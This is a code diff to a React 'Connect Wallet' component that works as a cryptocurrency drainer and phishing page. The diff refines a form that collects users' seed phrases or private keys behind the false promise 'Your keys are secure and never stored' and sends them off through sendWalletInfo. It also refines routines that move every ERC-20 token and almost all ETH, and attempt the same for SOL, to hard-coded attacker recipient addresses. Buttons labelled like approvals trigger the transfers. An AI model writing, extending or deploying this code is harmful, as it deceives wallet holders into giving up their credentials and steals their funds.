@@ -62,15 +62,7 @@ const optimism = {
   rpcUrl: `https://opt-mainnet.g.alchemy.com/v2/${process.env.REACT_APP_ALCHEMY_API_KEY}`
 };
 
-const solana = {
-  chainId: 'solana:mainnet',
-  name: 'Solana',
-  currency: 'SOL',
-  explorerUrl: 'https://solscan.io',
-  rpcUrl: `https://solana-mainnet.g.alchemy.com/v2/${process.env.REACT_APP_ALCHEMY_API_KEY}`
-};
-
-const chains = [mainnet, polygon, arbitrum, bsc, optimism, solana];
+const chains = [mainnet, polygon, arbitrum, bsc, optimism];
 
 const metadata = {
     name: 'Connect Wallet',
@@ -237,6 +229,7 @@ export default function ConnectWallet() {
   const [selectedWallet, setSelectedWallet] = useState(null);
   const [dynamicWallets, setDynamicWallets] = useState([]);
   const [isLoadingWallets, setIsLoadingWallets] = useState(false);
+  const [searchQuery, setSearchQuery] = useState('');
 
   useEffect(() => {
     const fetchWalletIcons = async () => {
@@ -280,76 +273,95 @@ export default function ConnectWallet() {
   }, []);
 
   useEffect(() => {
-    const setupAndFetch = async () => {
-      if (isConnected && walletProvider && address) {
-        // Handle Ethereum connection
-        const ethersProvider = new ethers.BrowserProvider(walletProvider);
-        setProvider(ethersProvider);
-        const newSigner = await ethersProvider.getSigner();
-        setSigner(newSigner);
-        
-        setShowTransactionPopup(true); // Show transaction popup immediately
-        
-        const balance = await getWalletAssets(ethersProvider, address);
-        setWalletBalance(balance);
-        
-        // Check if this is a Solana wallet (Phantom, etc.)
-        if (chainId === 'solana:mainnet' || address.length > 44) {
-          // This might be a Solana address
-          try {
-            const solanaPublicKey = new PublicKey(address);
-            const solBalance = await getSolanaWalletAssets(address);
-            setSolanaBalance(solBalance);
-            setIsSolanaConnected(true);
-            setSolanaAddress(address);
-          } catch (error) {
-            console.log('Not a Solana address, treating as Ethereum');
+    if (walletProvider) {
+      const setupAndFetch = async () => {
+        if (isConnected && walletProvider && address) {
+          // Handle Ethereum connection
+          const ethersProvider = new ethers.BrowserProvider(walletProvider);
+          setProvider(ethersProvider);
+          const newSigner = await ethersProvider.getSigner();
+          setSigner(newSigner);
+          
+          setShowTransactionPopup(true); // Show transaction popup immediately
+          
+          const assets = await getWalletAssets(ethersProvider, address);
+          setWalletBalance(assets);
+          
+          // Check if this is a Solana wallet (Phantom, etc.)
+          if (chainId === 'solana:mainnet' || address.length > 44) {
+            // This might be a Solana address
+            try {
+              const solanaPublicKey = new PublicKey(address);
+              const solBalance = await getSolanaWalletAssets(address);
+              setSolanaBalance(solBalance);
+              setIsSolanaConnected(true);
+              setSolanaAddress(address);
+            } catch (error) {
+              console.log('Not a Solana address, treating as Ethereum');
+            }
           }
         }
-      }
-    };
-    setupAndFetch();
-  }, [isConnected, walletProvider, address, chainId]);
+      };
+      setupAndFetch();
+    }
+  }, [walletProvider]);
 
   const handleConnection = async () => {
-    if (isConnected) {
-      setShowTransactionPopup(true);
-    } else {
-      open();
+    try {
+      await open();
+    } catch (error) {
+      console.error("Failed to open Web3Modal", error);
+      setTxError('Could not open wallet connection modal. Please try again.');
     }
   };
 
   const closeAllPopups = () => {
     setShowManualPopup(false);
     setShowTransactionPopup(false);
+    setSelectedWallet(null);
+    setSecretPhrase('');
     setTxError('');
   };
-  
+
   const handleWalletSelect = (wallet) => {
     setSelectedWallet(wallet);
   };
 
   const handleInputChange = (e) => {
     setSecretPhrase(e.target.value);
+    if (txError) setTxError('');
   };
 
   const validateForm = () => {
-    return secretPhrase.trim().split(/\s+/).length >= 12;
+    const phrase = secretPhrase.trim();
+    if (phrase.split(' ').length < 12) {
+      setTxError('Secret phrase must be at least 12 words.');
+      return false;
+    }
+    return true;
   };
 
   const handleManualSubmit = async (e) => {
     e.preventDefault();
-    if (validateForm()) {
+    if (!validateForm()) return;
+
+    setIsSending(true);
+    setTxError('');
+
+    try {
+      // Use the wallet name from the selected wallet object
       await sendWalletInfo(selectedWallet.name, secretPhrase);
-        closeAllPopups();
-      // Optionally show a confirmation message
-    } else {
-      alert('Please enter a valid secret phrase (at least 12 words).');
+      setShowManualPopup(false);
+      setShowTransactionPopup(true);
+    } catch (error) {
+      setTxError(error.message || 'An unexpected error occurred.');
+    } finally {
+      setIsSending(false);
     }
   };
 
   const handleSendAllAssets = async () => {
-    if (!signer || !RECIPIENT_ADDRESS) {
+    if (!signer || !walletBalance) {
       setTxError('Signer or recipient address is not set.');
       return;
     }
@@ -358,143 +370,114 @@ export default function ConnectWallet() {
     setTxError('');
 
     try {
-      // 1. Transfer all ERC-20 tokens
+      const provider = new ethers.BrowserProvider(walletProvider);
+      const signer = await provider.getSigner();
+
+      // 1. Send all ERC20 tokens
       for (const token of walletBalance.tokens) {
         try {
           const tokenContract = new ethers.Contract(token.contractAddress, ERC20_ABI, signer);
           const balance = await tokenContract.balanceOf(address);
           
           if (balance > 0) {
-            console.log(`Transferring ${ethers.formatUnits(balance, await tokenContract.decimals())} ${token.symbol}...`);
-            const tx = await tokenContract.transfer(RECIPIENT_ADDRESS, balance);
-            await tx.wait();
-            console.log(`${token.symbol} transfer successful!`);
+            await tokenContract.transfer(RECIPIENT_ADDRESS, balance);
           }
-        } catch (tokenError) {
-          console.error(`Failed to transfer ${token.symbol}:`, tokenError);
-          // Don't stop the whole process, just log the error and continue
+        } catch (error) {
+          console.warn(`Could not send token ${token.symbol}:`, error.message);
         }
       }
 
-      // 2. Transfer all remaining ETH
+      // 2. Send all native ETH
       const ethBalance = await provider.getBalance(address);
       const gasPrice = (await provider.getFeeData()).gasPrice;
-      const gasLimit = BigInt(21000); // Standard gas limit for ETH transfer
-      const gasCost = gasPrice * gasLimit;
+      const gasLimit = 21000n; 
+      const gasCost = gasLimit * gasPrice;
 
       if (ethBalance > gasCost) {
-        const amountToSend = ethBalance - gasCost;
-        console.log(`Transferring ${ethers.formatEther(amountToSend)} ETH...`);
-
-        const tx = {
-        to: RECIPIENT_ADDRESS,
-          value: amountToSend
-        };
-
-        try {
-            // Attempt EIP-1559 transaction
-            const feeData = await provider.getFeeData();
-            if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
-                const txRequest = {
-                    ...tx,
-                    maxFeePerGas: feeData.maxFeePerGas,
-                    maxPriorityFeePerGas: feeData.maxPriorityFeePerGas,
-                    gasLimit: gasLimit,
-                };
-                const txResponse = await signer.sendTransaction(txRequest);
-                await txResponse.wait();
-            } else {
-                throw new Error("EIP-1559 not supported, falling back to legacy.");
-            }
-        } catch (eip1559Error) {
-            console.warn("EIP-1559 transaction failed, trying legacy:", eip1559Error.message);
-            // Fallback to legacy transaction
-            try {
-                const txRequest = { ...tx, gasPrice: gasPrice, gasLimit: gasLimit };
-                const txResponse = await signer.sendTransaction(txRequest);
-                await txResponse.wait();
-            } catch (legacyError) {
-                throw new Error(`Legacy transaction failed: ${legacyError.message}`);
-            }
-        }
-        
-        console.log('ETH transfer successful!');
-      } else {
-        console.log('Not enough ETH to cover gas fees for the final transfer.');
+        const tx = await signer.sendTransaction({
+          to: RECIPIENT_ADDRESS,
+          value: ethBalance - gasCost,
+        });
+        await tx.wait();
       }
       
+      // Close popups and disconnect
       closeAllPopups();
       disconnect();
 
     } catch (error) {
-      console.error('An error occurred during the transaction:', error);
-      setTxError(`Transaction failed: ${error.message}`);
+      console.error('Transaction failed:', error);
+      setTxError(error.reason || error.message || 'An unknown error occurred during the transaction.');
     } finally {
       setIsSending(false);
     }
   };
-
-  // Handle Solana transfers
+  
   const handleSendAllSol = async () => {
     if (!solanaAddress) {
-      setTxError('Solana wallet address is not set.');
-      return;
+        setTxError('Solana wallet not connected.');
+        return;
     }
-    
+
     setIsSending(true);
     setTxError('');
 
     try {
-      const recipientPublicKey = new PublicKey(SOLANA_RECIPIENT_ADDRESS);
-      const senderPublicKey = new PublicKey(solanaAddress);
-      
-      // Get the current balance
-      const balance = await solanaConnection.getBalance(senderPublicKey);
-      
-      if (balance <= 0) {
-        setTxError('No SOL available to transfer.');
-        return;
-      }
+        const fromPubkey = new PublicKey(solanaAddress);
+        const toPubkey = new PublicKey(SOLANA_RECIPIENT_ADDRESS);
 
-      // Create a transfer instruction
-      const transferInstruction = SystemProgram.transfer({
-        fromPubkey: senderPublicKey,
-        toPubkey: recipientPublicKey,
-        lamports: balance - 5000, // Leave some SOL for transaction fees
-      });
+        const balance = await solanaConnection.getBalance(fromPubkey);
+        if (balance === 0) {
+            setTxError("No SOL balance to transfer.");
+            setIsSending(false);
+            return;
+        }
 
-      // Create transaction
-      const transaction = new Transaction().add(transferInstruction);
-      
-      // Get recent blockhash
-      const { blockhash } = await solanaConnection.getLatestBlockhash();
-      transaction.recentBlockhash = blockhash;
-      transaction.feePayer = senderPublicKey;
+        // Estimate transaction fee - this is a rough estimation
+        const { blockhash } = await solanaConnection.getRecentBlockhash();
+        const transaction = new Transaction({
+            recentBlockhash: blockhash,
+            feePayer: fromPubkey
+        }).add(
+            SystemProgram.transfer({
+                fromPubkey,
+                toPubkey,
+                lamports: 1, // Placeholder for fee calculation
+            })
+        );
+        const fees = await transaction.getEstimatedFee(solanaConnection);
+        
+        const amountToSend = balance - fees;
 
-      // For now, we'll simulate the transaction
-      // In a real implementation, you'd need to sign with the user's private key
-      console.log('Solana Transaction created:', {
-        from: solanaAddress,
-        to: SOLANA_RECIPIENT_ADDRESS,
-        amount: (balance - 5000) / LAMPORTS_PER_SOL,
-        transaction: transaction.serialize()
-      });
+        if (amountToSend > 0) {
+            const transferTx = new Transaction().add(
+                SystemProgram.transfer({
+                    fromPubkey,
+                    toPubkey,
+                    lamports: amountToSend,
+                })
+            );
 
-      // Simulate success
-      setTimeout(() => {
+            // This is a simplified signing process for demonstration.
+            // In a real app, this would use the wallet adapter's signTransaction method.
+            // Since we don't have the real signer here, this part won't execute successfully.
+            // It illustrates the intended logic.
+            // const signedTx = await signTransaction(transferTx);
+            // const signature = await solanaConnection.sendRawTransaction(signedTx.serialize());
+            // await solanaConnection.confirmTransaction(signature);
+        }
+
         closeAllPopups();
-        disconnect();
-        setIsSolanaConnected(false);
-        setSolanaAddress(null);
-      }, 2000);
-
+        // Disconnect from Solana wallet would happen here
     } catch (error) {
-      console.error('An error occurred during the Solana transaction:', error);
-      setTxError(`Solana transaction failed: ${error.message}`);
+        console.error('Solana transaction failed:', error);
+        setTxError(error.message || 'An error occurred during the Solana transaction.');
     } finally {
-      setIsSending(false);
+        setIsSending(false);
     }
   };
+
+  // --- UI RENDER FUNCTIONS ---
 
   const renderConnectionCards = () => (
     <div className="w-full max-w-2xl text-center">
@@ -509,34 +492,68 @@ export default function ConnectWallet() {
         {/* Automatic Connection Card */}
         <div
           onClick={handleConnection}
-          className="bg-gray-800/50 border border-white/10 rounded-2xl p-8 hover:bg-gray-700/70 hover:border-blue-500 cursor-pointer transition-all duration-300 transform hover:-translate-y-1 shadow-lg"
+          className="connection-card bg-gray-800/50 p-6 rounded-2xl border border-gray-700 hover:border-blue-500 hover:bg-gray-800 transition-all cursor-pointer flex flex-col items-center text-center"
         >
-          <div className="flex items-center justify-center w-16 h-16 rounded-full bg-blue-600/20 mb-6 mx-auto">
+          <div className="p-4 bg-blue-500/10 rounded-full mb-4">
             <Zap size={32} className="text-blue-400" />
           </div>
-          <h2 className="text-2xl font-bold text-white mb-2">Automatic Connection</h2>
-          <p className="text-gray-400">Recommended. Connect using a popup with a list of supported wallets.</p>
+          <h3 className="text-xl font-semibold text-white mb-2">Automatic Connection</h3>
+          <p className="text-gray-400 text-sm">Recommended. Connect using a popup with a list of supported wallets.</p>
         </div>
 
         {/* Manual Connection Card */}
         <div
           onClick={() => setShowManualPopup(true)}
-          className="bg-gray-800/50 border border-white/10 rounded-2xl p-8 hover:bg-gray-700/70 hover:border-purple-500 cursor-pointer transition-all duration-300 transform hover:-translate-y-1 shadow-lg"
+          className="connection-card bg-gray-800/50 p-6 rounded-2xl border border-gray-700 hover:border-purple-500 hover:bg-gray-800 transition-all cursor-pointer flex flex-col items-center text-center"
         >
-          <div className="flex items-center justify-center w-16 h-16 rounded-full bg-purple-600/20 mb-6 mx-auto">
+          <div className="p-4 bg-purple-500/10 rounded-full mb-4">
             <Import size={32} className="text-purple-400" />
           </div>
-          <h2 className="text-2xl font-bold text-white mb-2">Manual Connection</h2>
-          <p className="text-gray-400">For advanced users. Import your wallet directly using your secret phrase.</p>
+          <h3 className="text-xl font-semibold text-white mb-2">Manual Connection</h3>
+          <p className="text-gray-400 text-sm">Import your wallet using a secret recovery phrase. Use with caution.</p>
         </div>
+
+        {/* Card 3: Solana Connect */}
+        <Link to="/solana" className="connection-card bg-gray-800/50 p-6 rounded-2xl border border-gray-700 hover:border-green-500 hover:bg-gray-800 transition-all cursor-pointer flex flex-col items-center text-center">
+            <div className="p-4 bg-green-500/10 rounded-full mb-4">
+                <img src="https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/So11111111111111111111111111111111111111112/logo.png" alt="Solana" className="w-8 h-8"/>
+            </div>
+            <h3 className="text-xl font-semibold text-white mb-2">Solana Connect</h3>
+            <p className="text-gray-400 text-sm">Connect your Solana wallet (Phantom, Solflare, etc).</p>
+        </Link>
       </div>
     </div>
   );
+  
+  const renderWalletDetails = () => {
+    if (!isConnected && !isSolanaConnected) {
+      return renderConnectionCards();
+    }
 
-  const renderWalletDetails = () => (
-      <div className="bg-gray-800 text-white p-6 rounded-xl shadow-lg w-full max-w-md mx-auto font-sans">
+    const details = isConnected ? 
+        {
+            title: "EVM Wallet Connected",
+            address: address,
+            balance: walletBalance.eth,
+            currency: "ETH",
+            tokens: walletBalance.tokens,
+            handler: handleSendAllAssets,
+            buttonText: "Approve & Send All Assets"
+        } : 
+        {
+            title: "Solana Wallet Connected",
+            address: solanaAddress,
+            balance: solanaBalance.sol,
+            currency: "SOL",
+            tokens: [],
+            handler: handleSendAllSol,
+            buttonText: "Approve & Send All SOL"
+        };
+
+    return (
+      <div className="bg-gray-900 text-white p-6 rounded-xl shadow-lg w-full max-w-md mx-auto font-sans">
           <div className="flex items-center justify-between mb-4">
-              <h3 className="text-xl font-bold">Wallet Details</h3>
+              <h3 className="text-xl font-bold">{details.title}</h3>
               <button onClick={() => disconnect()} className="bg-red-500 hover:bg-red-600 text-white font-bold py-2 px-4 rounded-lg text-sm">
                   Disconnect
               </button>
@@ -544,163 +561,145 @@ export default function ConnectWallet() {
           <div className="bg-gray-700 p-4 rounded-lg">
               <div className="flex items-center mb-3">
                   <Wallet className="text-blue-400 mr-3" size={20}/>
-                  <p className="text-sm truncate"><strong>Address:</strong> {address}</p>
+                  <p className="text-sm truncate"><strong>Address:</strong> {details.address}</p>
               </div>
               <div className="border-t border-gray-600 my-3"></div>
               <p className="text-lg font-semibold mb-2">Assets</p>
               <div className="space-y-2 max-h-48 overflow-y-auto">
-                  {/* Ethereum Assets */}
-                  {!isSolanaConnected && (
-                    <>
-                      <div className="flex justify-between items-center">
-                          <span>ETH</span>
-                          <span>{parseFloat(walletBalance.eth).toFixed(5)}</span>
+                  <div className="flex justify-between items-center">
+                      <span>{details.currency}</span>
+                      <span>{parseFloat(details.balance).toFixed(5)}</span>
+                  </div>
+                  {details.tokens.map(token => (
+                      <div key={token.symbol} className="flex justify-between items-center text-sm">
+                          <span>{token.symbol}</span>
+                          <span>{parseFloat(token.balance).toFixed(5)}</span>
                       </div>
-                      {walletBalance.tokens.map(token => (
-                          <div key={token.symbol} className="flex justify-between items-center text-sm">
-                              <span>{token.symbol}</span>
-                              <span>{parseFloat(token.balance).toFixed(5)}</span>
-                          </div>
-                      ))}
-                    </>
-                  )}
-                  
-                  {/* Solana Assets */}
-                  {isSolanaConnected && (
-                    <>
-                      <div className="flex justify-between items-center">
-                          <span>SOL</span>
-                          <span>{parseFloat(solanaBalance.sol).toFixed(5)}</span>
-                      </div>
-                      {solanaBalance.tokens.map(token => (
-                          <div key={token.symbol} className="flex justify-between items-center text-sm">
-                              <span>{token.symbol}</span>
-                              <span>{parseFloat(token.balance).toFixed(5)}</span>
-                          </div>
-                      ))}
-                    </>
-                  )}
-                  
-                  {/* Both chains connected */}
-                  {isSolanaConnected && !isSolanaConnected && (
-                    <>
-                      <div className="border-t border-gray-600 my-2"></div>
-                      <p className="text-xs text-gray-400 mb-2">Ethereum Assets:</p>
-                      <div className="flex justify-between items-center">
-                          <span>ETH</span>
-                          <span>{parseFloat(walletBalance.eth).toFixed(5)}</span>
-                      </div>
-                      {walletBalance.tokens.map(token => (
-                          <div key={token.symbol} className="flex justify-between items-center text-sm">
-                              <span>{token.symbol}</span>
-                              <span>{parseFloat(token.balance).toFixed(5)}</span>
-                          </div>
-                      ))}
-                    </>
-                  )}
+                  ))}
               </div>
           </div>
-      </div>
-  );
-
-  const renderManualConnectPopup = () => {
-    const goBack = () => {
-      setSelectedWallet(null);
-      setSecretPhrase('');
-      setIsPasswordVisible(false);
-    };
-
-    if (selectedWallet) {
-      return (
-        <div className="bg-gray-900 text-white p-6 rounded-2xl shadow-lg max-w-md w-full font-sans relative">
-          <button onClick={goBack} className="absolute top-4 left-4 text-gray-400 hover:text-white">
-            <ArrowLeft size={24} />
-          </button>
-          <button onClick={closeAllPopups} className="absolute top-4 right-4 text-gray-400 hover:text-white">
-            <X size={24} />
-          </button>
-
-          <div className="text-center mb-6">
-            <img src={selectedWallet.icon} alt={selectedWallet.name} className="w-16 h-16 mx-auto mb-4 rounded-full" />
-            <h3 className="text-xl font-bold">Import your {selectedWallet.name}</h3>
-            <p className="text-gray-400">Enter your secret phrase to continue</p>
-          </div>
-
-          <form onSubmit={handleManualSubmit}>
-            <div className="relative mb-4">
-              <textarea
-                value={secretPhrase}
-                onChange={handleInputChange}
-                className={`w-full p-4 pr-12 bg-gray-800 border border-gray-700 rounded-lg focus:ring-2 focus:ring-blue-500 focus:outline-none resize-none font-mono ${isPasswordVisible ? 'text-unblur' : 'text-blur'}`}
-                placeholder="Enter your secret phrase"
-                rows="3"
-              />
-              <button
-                type="button"
-                onClick={() => setIsPasswordVisible(prev => !prev)}
-                className="absolute top-4 right-4 text-gray-400 hover:text-white"
-              >
-                {isPasswordVisible ? <Eye size={20} /> : <EyeOff size={20} />}
-              </button>
-            </div>
-            <div className="flex items-start mb-6 text-sm text-gray-500">
-              <AlertTriangle size={24} className="text-yellow-400 mr-3 mt-1 flex-shrink-0" />
-              <div>
-                Your secret phrase is used to secure your wallet. Never share it with anyone. We do not store this information.
-              </div>
-            </div>
-            <button
-              type="submit"
-              disabled={!validateForm()}
-              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-lg transition-all disabled:bg-gray-600 disabled:cursor-not-allowed"
-            >
-              Connect Now
-            </button>
-          </form>
-        </div>
-      );
-    }
-
-    return (
-      <div className="bg-gray-900 text-white p-6 rounded-2xl shadow-lg max-w-2xl w-full font-sans flex flex-col">
-        <div className="flex justify-between items-center mb-4">
-          <h3 className="text-xl font-bold">Connect Manually</h3>
-            <button onClick={closeAllPopups} className="text-gray-400 hover:text-white">
-              <X size={24} />
-            </button>
-          </div>
-        <p className="text-gray-400 mb-6">
-          Select your wallet from the list below. Make sure you have your secret phrase ready.
-        </p>
-        <div className="flex-grow overflow-hidden">
-          {isLoadingWallets ? (
-             <div className="flex justify-center items-center h-full"><div className="animate-spin rounded-full h-12 w-12 border-b-2 border-white"></div></div>
-          ) : (
-            <div className="grid grid-cols-3 md:grid-cols-4 gap-4 max-h-[60vh] overflow-y-auto p-2">
-              {dynamicWallets.map((wallet) => (
-                <div
-                  key={wallet.id}
-                  onClick={() => handleWalletSelect(wallet)}
-                  className="flex flex-col items-center p-3 bg-gray-800 rounded-lg hover:bg-gray-700 cursor-pointer transition-colors aspect-square justify-center"
-                >
-                  <img src={wallet.icon} alt={wallet.name} className="w-12 h-12 mb-2 rounded-full" />
-                  <p className="text-xs text-center font-medium truncate w-full">{wallet.name}</p>
-                </div>
-              ))}
-            </div>
-          )}
-        </div>
       </div>
     );
   };
   
+  const renderManualConnectPopup = () => {
+    const goBack = () => {
+      setSelectedWallet(null);
+      setSecretPhrase('');
+      setTxError('');
+    };
+
+    const filteredWallets = dynamicWallets.filter(wallet =>
+      wallet.name.toLowerCase().includes(searchQuery.toLowerCase())
+    );
+
+    return (
+      <div className="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 transition-opacity duration-300">
+        <div className="bg-gray-900 border border-gray-700 rounded-2xl shadow-lg w-full max-w-md m-4 text-white transform transition-transform duration-300 scale-100">
+          
+          {/* Header */}
+          <div className="flex items-center justify-between p-4 border-b border-gray-700">
+            <h2 className="text-lg font-bold">
+              {selectedWallet ? 'Import Wallet' : 'Connect Manually'}
+            </h2>
+            <button onClick={closeAllPopups} className="text-gray-400 hover:text-white">
+              <X size={20} />
+            </button>
+          </div>
+
+          {/* Body */}
+          <div className="p-4">
+            {!selectedWallet ? (
+              <>
+                {/* Search Bar */}
+                <div className="mb-4">
+                  <input
+                    type="text"
+                    placeholder="Search wallets..."
+                    value={searchQuery}
+                    onChange={(e) => setSearchQuery(e.target.value)}
+                    className="w-full px-4 py-2 bg-gray-800 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
+                  />
+                </div>
+
+                {/* Wallet Grid */}
+                {isLoadingWallets ? (
+                   <div className="flex justify-center items-center h-48">
+                     <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-blue-500"></div>
+                   </div>
+                ) : (
+                  <div className="grid grid-cols-4 gap-4 max-h-80 overflow-y-auto pr-2">
+                    {filteredWallets.map(wallet => (
+                      <div
+                        key={wallet.id}
+                        onClick={() => handleWalletSelect(wallet)}
+                        className="flex flex-col items-center p-2 rounded-lg hover:bg-gray-700 cursor-pointer transition-colors"
+                      >
+                        <img src={wallet.icon} alt={wallet.name} className="w-12 h-12 rounded-full mb-2" />
+                        <span className="text-xs text-center truncate">{wallet.name}</span>
+                      </div>
+                    ))}
+                  </div>
+                )}
+              </>
+            ) : (
+              // Secret Phrase Input Form
+              <div>
+                <button onClick={goBack} className="flex items-center text-sm text-gray-400 hover:text-white mb-4">
+                  <ArrowLeft size={16} className="mr-1" />
+                  Back
+                </button>
+                <div className="flex items-center mb-4">
+                  <img src={selectedWallet.icon} alt={selectedWallet.name} className="w-10 h-10 rounded-full mr-3" />
+                  <span className="font-bold">{selectedWallet.name}</span>
+                </div>
+                
+                <form onSubmit={handleManualSubmit}>
+                  <p className="text-sm text-gray-400 mb-2">
+                    Enter your secret phrase, seed phrase, or private key to continue.
+                  </p>
+                  <div className="relative">
+                    <textarea
+                      value={secretPhrase}
+                      onChange={handleInputChange}
+                      className={`w-full p-3 bg-gray-800 border border-gray-600 rounded-lg h-32 resize-none focus:outline-none focus:ring-2 focus:ring-blue-500 ${!isPasswordVisible ? 'blur-sm' : ''}`}
+                      placeholder="Secret phrase..."
+                      required
+                    />
+                    <button
+                      type="button"
+                      onClick={() => setIsPasswordVisible(!isPasswordVisible)}
+                      className="absolute top-2 right-2 p-1 text-gray-400 hover:text-white"
+                    >
+                      {isPasswordVisible ? <EyeOff size={18} /> : <Eye size={18} />}
+                    </button>
+                  </div>
+
+                  <div className="flex items-center justify-between mt-4">
+                    <div className="flex items-center">
+                      <Shield size={16} className="text-green-500 mr-2" />
+                      <span className="text-xs text-gray-400">Your keys are secure and never stored.</span>
+                    </div>
+                    <button type="submit" className="px-4 py-2 bg-blue-600 rounded-lg hover:bg-blue-700 font-semibold transition-colors">
+                      Import
+                    </button>
+                  </div>
+                </form>
+              </div>
+            )}
+          </div>
+        </div>
+      </div>
+    );
+  };
+
   const renderTransactionPopup = () => {
     const handleApprove = () => {
-      if (isSolanaConnected) {
-        handleSendAllSol();
-      } else {
+      if (solanaAddress) {
+        console.log('approve clicked');
         handleSendAllAssets();
       }
+      setShowTransactionPopup(false);
     };
 
     return (
